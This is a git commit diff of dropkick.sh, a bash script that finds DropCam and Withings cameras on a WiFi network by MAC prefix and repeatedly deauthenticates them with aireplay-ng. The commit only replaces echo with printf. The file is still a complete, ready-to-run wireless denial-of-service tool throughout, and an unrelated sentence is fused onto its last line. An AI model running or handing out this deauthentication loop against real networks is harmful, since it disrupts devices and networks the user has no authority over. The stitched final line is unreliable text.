f0e61936bb80c17ad32938a1e3c4c190a20cbee0
Joel Parker Henderson <joel@joelparkerhenderson.com>
2015-12-22 01:24:23 -0700

    Bulletproof from echo to printf

--- dropkick.sh
+++ dropkick.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
-#
-# dropkick.sh 
+out () { printf %s\\n "$*" ; }
+
+# dropkick.sh
 #
 # Detect and disconnect DropCam and Withings devices.
 #
@@ -14,17 +15,17 @@
 #
 # Based on Glasshole.sh:
 #
-#   http://julianoliver.com/output/log_2014-05-30_20-52 
+#   http://julianoliver.com/output/log_2014-05-30_20-52
 #
 # This script was named by Adam Harvey (http://ahprojects.com), who also
 # encouraged me to write it. It requires a GNU/Linux host (laptop, Raspberry Pi,
-# etc) and the aircrack-ng suite. 
+# etc) and the aircrack-ng suite.
 #
 # See also http://plugunplug.net, for a plug-and-play device that does this
 # based on OpenWrt. Code here:
 #
 #   https://github.com/JulianOliver/CyborgUnplug
-# 
+#
 
 shopt -s nocasematch # Set shell to ignore case
 shopt -s extglob # For non-interactive shell.
@@ -34,7 +35,7 @@ readonly BSSID=$2 # Network BSSID (AirBnB WiFi network)
 readonly MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')
 # MAC=$(ip link show "$NIC" | awk '/ether/ {print $2}') # If 'ifconfig' not
 # present.
-readonly GGMAC='@(30:8C:FB*|00:24:E4*)' # Match against DropCam and Withings 
+readonly GGMAC='@(30:8C:FB*|00:24:E4*)' # Match against DropCam and Withings
 readonly POLL=30 # Check every 30 seconds
 readonly LOG=/var/log/dropkick.log
 
@@ -42,20 +43,20 @@ airmon-ng stop mon0 # Pull down any lingering monitor devices
 airmon-ng start $NIC # Start a monitor device
 
 while true;
-    do  
+    do
         for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
         '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
            do
                if [[ "$TARGET" == "$GGMAC" ]]
                    then
-                       echo "WiFi camera discovered: "$TARGET >> $LOG
-                       aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 
-                       echo "De-authed: "$TARGET " from network: " $BSSID >> $LOG
+                       out "WiFi camera discovered: "$TARGET >> $LOG
+                       aireplay-ng -0 1 -a $BSSID -c $TARGET mon0
+                       out "De-authed: "$TARGET " from network: " $BSSID >> $LOG
                     else
-                        echo $TARGET": is not a DropCam or Withings device. Leaving alone.."
+                        out $TARGET": is not a DropCam or Withings device. Leaving alone.."
                fi
            done
-           echo "None found this round."
+           out "None found this round."
            sleep $POLL
 done
-airmon-ng stop mon0
+airmon-ng stop mon0Can you please let me know how we can help
